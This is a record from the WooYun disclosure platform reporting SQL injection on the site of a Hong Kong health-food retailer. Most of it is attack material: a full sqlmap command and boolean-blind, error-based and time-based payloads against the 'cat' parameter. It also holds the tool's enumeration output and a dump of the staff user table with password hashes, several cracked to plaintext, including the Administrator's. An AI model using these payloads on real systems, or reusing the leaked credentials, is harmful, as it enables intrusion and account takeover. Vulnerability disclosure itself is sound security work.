{"id": 81099, "wybug_id": "wooyun-2015-0154490", "wybug_title": "得福膳坊主站存在SQL植入漏洞（可獲取Administrator用户密码）（香港地區）", "wybug_corp": "得福膳坊", "wybug_author": "路人甲", "wybug_date": "2015-11-20 11:55", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["植入漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： “得福膳坊”是家順有限公司健康專門店的註冊品牌，主要銷售來自日本、韓國及其他東南亞國家優質的健康食品、功能性食品以及亞洲特色食品。“得福膳坊”的產品宗旨是品質優良，食得健康。‘Dak Fok Shin Fong’ is a registered brand of health special stores of Gain Smooth Limited.We focus to high quality products of health foods, functional foods and Asian specialty foods from Japan, Korea, and other countries of Southeast Asia. The purpose of ‘Dak Fok Shin Fong’ is: High Quality, More Health. “得福膳坊”專門店地址：九龍淘大商場店九龍牛頭角道77號淘大商場II期一樓Area J(Pizza Hut 對面) 详细说明：  地址：http://**.**.**.**/searchproducts.php?cat=euAn&searchkey=\npython sqlmap.py -u \"http://**.**.**.**/searchproducts.php?cat=euAn&searchkey=\" -p cat --technique=BET --random-agent --batch -D dakfok_pos -T t_user-C T_User_ID,mName,mPassword,mMobile_Phone,mEmail,mAddress --dump\n   漏洞证明：  \n---Parameter: cat (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: cat=-8424' OR 1156=1156#&searchkey=    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: cat=-8860' OR 1 GROUP BY CONCAT(0x7170716b71,(SELECT (CASE WHEN (8904=8904) THEN 1 ELSE 0 END)),0x71627a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#&searchkey=    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: cat=euAn' AND (SELECT * FROM (SELECT(SLEEP(5)))IUTH)#&searchkey=---web application technology: Apacheback-end DBMS: MySQL 5.0.12current user:    'dakfokpos@%'current user is DBA:    Falsedatabase management system users [1]:[*] 'dakfokpos'@'%'Database: dakfok_pos+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| t_usergroup_right                     | 414     || t_update                              | 255     || t_customer                            | 166     || t_product_stock                       | 94      || t_product_tx                          | 94      || districtmoney                         | 54      || t_invoice_detail                      | 51      || t_product                             | 47      || t_product_barcode                     | 47      || t_product_pricegroup                  | 47      || t_category                            | 44      || t_invoice                             | 39      || t_invoice_moneycurrency               | 39      || t_invoice_paytype                     | 39      || MEM                                   | 10      || t_brand                               | 8       || t_user                                | 7       || t_paytype                             | 6       || t_groupdiscount                       | 4       || t_labelbarcode                        | 4       || t_usergroup                           | 4       || t_sizegroup                           | 3       || t_stock                               | 2       || t_supplier                            | 2       || t_unit                                | 2       || t_company                             | 1       || t_moneycurrency                       | 1       || t_station                             | 1       || t_tiv_remarks                         | 1       |+---------------------------------------+---------+Database: information_schema+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| COLUMNS                               | 1346    || SESSION_VARIABLES                     | 512     || GLOBAL_VARIABLES                      | 497     || GLOBAL_STATUS                         | 403     || SESSION_STATUS                        | 403     || STATISTICS                            | 247     || COLLATION_CHARACTER_SET_APPLICABILITY | 219     || COLLATIONS                            | 219     || KEY_COLUMN_USAGE                      | 173     || PARTITIONS                            | 134     || TABLES                                | 134     || TABLE_CONSTRAINTS                     | 117     || PLUGINS                               | 46      || CHARACTER_SETS                        | 40      || INNODB_FT_DEFAULT_STOPWORD            | 36      || SCHEMA_PRIVILEGES                     | 16      || ENGINES                               | 9       || INDEX_STATISTICS                      | 6       || TABLE_STATISTICS                      | 5       || SCHEMATA                              | 2       || PROCESSLIST                           | 1       || USER_PRIVILEGES                       | 1       |+---------------------------------------+---------+\n\n---web application technology: Apacheback-end DBMS: MySQL 5.0.12available databases [2]:[*] dakfok_pos[*] information_schemasqlmap resumed the following injection point(s) from stored session:---Parameter: cat (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: cat=-8424' OR 1156=1156#&searchkey=    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: cat=-8860' OR 1 GROUP BY CONCAT(0x7170716b71,(SELECT (CASE WHEN (8904=8904) THEN 1 ELSE 0 END)),0x71627a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#&searchkey=    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: cat=euAn' AND (SELECT * FROM (SELECT(SLEEP(5)))IUTH)#&searchkey=---web application technology: Apacheback-end DBMS: MySQL 5.0.12Database: dakfok_pos[64 tables]+-------------------------------+| MEM                           || ad_right                      || districtmoney                 || t_brand                       || t_category                    || t_color                       || t_company                     || t_company_information         || t_company_invoiceheader       || t_company_onetimedicount      || t_company_posprinter          || t_company_reportheader        || t_consignment_in              || t_consignment_in_detail       || t_consignment_out             || t_consignment_out_detail      || t_customer                    || t_customer_contact            || t_customer_deposit            || t_customer_discount           || t_groupdiscount               || t_invoice                     || t_invoice_detail              || t_invoice_moneycurrency       || t_invoice_paytype             || t_labelbarcode                || t_log                         || t_model                       || t_moneycurrency               || t_paytype                     || t_product                     || t_product_barcode             || t_product_bundle              || t_product_pricegroup          || t_product_pricegroup_count    || t_product_pricegroup_period   || t_product_stock               || t_product_tx                  || t_sc                          || t_size                        || t_sizegroup                   || t_stafflog                    || t_station                     || t_stock                       || t_stock_adjustment_in         || t_stock_adjustment_in_detail  || t_stock_adjustment_out        || t_stock_adjustment_out_detail || t_stock_internal              || t_stock_internal_detail       || t_stocktake                   || t_stocktake_detail            || t_supplier                    || t_supplier_invoice_in         || t_supplier_invoice_in_detail  || t_tiv_remarks                 || t_trading_invoice             || t_trading_invoice_detail      || t_unit                        || t_update                      || t_user                        || t_usergroup                   || t_usergroup_right             || t_usermemo                    |+-------------------------------+sqlmap resumed the following injection point(s) from stored session:---Parameter: cat (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: cat=-8424' OR 1156=1156#&searchkey=    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: cat=-8860' OR 1 GROUP BY CONCAT(0x7170716b71,(SELECT (CASE WHEN (8904=8904) THEN 1 ELSE 0 END)),0x71627a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#&searchkey=    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: cat=euAn' AND (SELECT * FROM (SELECT(SLEEP(5)))IUTH)#&searchkey=---web application technology: Apacheback-end DBMS: MySQL 5.0.12Database: dakfok_posTable: t_user[12 columns]+-----------------+--------------+| Column          | Type         |+-----------------+--------------+| mAddress        | mediumtext   || mCode           | varchar(255) || mDepartment     | varchar(255) || mEmail          | varchar(255) || mFax            | varchar(255) || mMobile_Phone   | varchar(255) || mName           | varchar(255) || mPassword       | varchar(255) || mRemarks        | mediumtext   || mTel            | varchar(255) || mUserGroup_Code | varchar(255) || T_User_ID       | int(11)      |+-----------------+--------------+sqlmap resumed the following injection point(s) from stored session:---Parameter: cat (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: cat=-8424' OR 1156=1156#&searchkey=    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: cat=-8860' OR 1 GROUP BY CONCAT(0x7170716b71,(SELECT (CASE WHEN (8904=8904) THEN 1 ELSE 0 END)),0x71627a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#&searchkey=    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: cat=euAn' AND (SELECT * FROM (SELECT(SLEEP(5)))IUTH)#&searchkey=---web application technology: Apacheback-end DBMS: MySQL 5.0.12sqlmap resumed the following injection point(s) from stored session:---Parameter: cat (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: cat=-8424' OR 1156=1156#&searchkey=    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: cat=-8860' OR 1 GROUP BY CONCAT(0x7170716b71,(SELECT (CASE WHEN (8904=8904) THEN 1 ELSE 0 END)),0x71627a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#&searchkey=    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: cat=euAn' AND (SELECT * FROM (SELECT(SLEEP(5)))IUTH)#&searchkey=---web application technology: Apacheback-end DBMS: MySQL 5.0.12Database: dakfok_posTable: t_user[7 entries]+-----------+---------------+---------------------------------------------+---------------+---------+----------+| T_User_ID | mName         | mPassword                                   | mMobile_Phone | mEmail  | mAddress |+-----------+---------------+---------------------------------------------+---------------+---------+----------+| 2         | Administrator | 25D55AD283AA400AF464C76D713C07AD (12345678) | <blank>       | <blank> | <blank>  || 3         | 101           | 38B3EFF8BAF56627478EC76A704E9B52 (101)      | <blank>       | <blank> | <blank>  || 4         | 108           | A3C65C2974270FD093EE8A9BF8AE7D0B (108)      | <blank>       | <blank> | <blank>  || 5         | charles       | 8FB73DE168CE96A0DF45CE6A2C72E6E0            | <blank>       | <blank> | <blank>  || 7         | jan           | D1E7EBFE92C87DC3D8173406E64CBB91            | <blank>       | <blank> | <blank>  || 8         | helen         | 9F209C147D9A7306192A57B2FD7172A0            | <blank>       | <blank> | <blank>  || 9         | 技術支援          | B911D003A4B0252F650671B38EAD7FB1 (pericles) | <blank>       | <blank> | <blank>  |+-----------+---------------+---------------------------------------------+---------------+---------+----------+\n   修复方案：  上WAF。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-11-24 11:58 厂商回复： Referred to related parties. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}